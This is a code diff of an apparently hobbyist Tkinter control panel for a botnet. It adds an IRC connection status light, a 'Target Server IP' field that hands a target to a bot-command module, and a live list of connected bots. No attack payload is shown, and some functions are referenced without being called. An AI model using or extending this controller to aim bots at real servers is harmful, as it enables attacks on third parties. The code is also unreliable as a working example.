@@ -1,10 +1,17 @@
 import tkinter as tk
+import time
+import socket
 master_client = __import__('master-client')
 
 
 
 window = tk.Tk()
 window.botcounter = 0
+
+connected = False
+
+botlist = ["111", "101", "0.0.0"]
+
 
 frame_a = tk.Frame()
 
@@ -16,11 +23,23 @@ frame_e = tk.Frame(master=window, width=400, height=100, bg="blue")
 frame_c = tk.Frame(master=window, width=400, height=400, bg="blue")
 frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
 
+def upload():
+    target = Targetip.get()
+    if connected == True:
+        send = master_client.Send
+        send.targetip = target
+        send.changeip
+    print(target)
 
 def connect():
     ip = IRCip.get()
-    client = master_client.Client(ip, 8080, 'master')
+    client = master_client.Client(ip, 9090, 'master')
     client.start()
+    global connected
+    time.sleep(1)
+    connected = client.authenticated
+    if connected == True:
+        lightupdate.set(1)
     print(ip)
 
 for i in range(2):
@@ -46,21 +65,21 @@ for i in range(2):
                 label.pack()
                 IRCip.pack()
                 button.pack()
+                button = tk.Button(master=frame, text="Disconnect")
+                button.pack()
             elif j == 1:
                 label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="Target Server IP")
                 Targetip= tk.Entry(master=frame)
                 label.pack()
                 Targetip.pack()
-                button = tk.Button(master=frame, text="Upload")
+                button = tk.Button(master=frame, command=upload, text="Upload")
                 button.pack()
             elif j == 2:
                 frame.config(bg="blue", borderwidth=0, highlightthickness=0)
                 light = tk.Canvas(master=frame, bg="blue", highlightthickness=0, relief=tk.FLAT, width=30, height=30)
                 coordinates = 2, 2, 29, 29
-                circle = light.create_oval(coordinates, fill="green", width=2)
-                #light.grid(row=i, column=j)
+                circle = light.create_oval(coordinates, fill="red", width=2)
                 label = tk.Label(master=frame, relief=tk.RAISED, borderwidth=1, fg="blue", text="IRC Connection Status")
-                #label.grid(row=i, column=j)
                 label.pack(side=tk.LEFT)
                 light.pack(padx=2, side=tk.RIGHT)
 
@@ -80,7 +99,7 @@ for i in range(2):
 
 scroll = tk.Scrollbar(master=frame_b)
 scroll.pack(side=tk.RIGHT, fill=tk.Y)
-canvas = tk.Canvas(master=frame_b,width=100)
+canvas = tk.Canvas(master=frame_b, width=100)
 bots = tk.Frame(master=canvas)
 scroll.config(command=canvas.yview)
 
@@ -92,6 +111,8 @@ bots.bind(
 )
 canvas.create_window((0,0), window=bots, anchor="nw")
 canvas.pack(fill=tk.Y, expand=True)
+buttonQ = tk.Button(master=frame_b, text="Quit", width=10, bg="red")
+buttonQ.pack(side=tk.BOTTOM)
 
 def handle_keypress(event):
     window.botcounter += 1
@@ -99,12 +120,32 @@ def handle_keypress(event):
                       text=f"BOT {window.botcounter}\nIP: 111.1.111.111\nPort: 25565\nJoined: 00.00")
     label1.pack(padx=5, pady=5)
 
+def handle_bots(*args):
+    list = bots.pack_slaves()
+    for i in list:
+        i.destroy()
+    for i in botlist:
+        label1 = tk.Label(master=bots, relief=tk.RAISED, borderwidth=1, fg="green",
+                          text=f"BOT {i}\nIP: {i}\nPort: 25565\nJoined: 00.00")
+        label1.pack(padx=5, pady=5)
+
+botupdate = tk.IntVar()
+botupdate.trace("w", handle_bots)
+
+def vartest(event):
+    botupdate.set(1)
 
 
+def handle_light(*args):
+    light.create_oval(coordinates, fill="green", width=2)
 
+lightupdate = tk.IntVar()
+lightupdate.trace("w", handle_light)
 
 
 window.bind("<Key a>", handle_keypress)
+window.bind("<Key b>", vartest)
+#window.bind("<Key c>", handle_light)
 
 label_a = tk.Label(master=frame_a, relief=tk.RAISED, borderwidth=5, text="Connected Bots")
 label_a.pack(padx=5)
@@ -114,5 +155,16 @@ frame_c.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
 frame_a.pack()
 frame_b.pack(fill=tk.Y, expand=True)
 
-window.mainloop()
+#window.mainloop()
+while 1:
+    if connected == True:
+        handle_light
+        oldlist = botlist
+        botlist = master_client.botlist
+        if botlist != oldlist:
+            botupdate.set(1)
+            continue
+    window.update_idletasks()
+    window.update()
+    time.sleep(0.01)
 
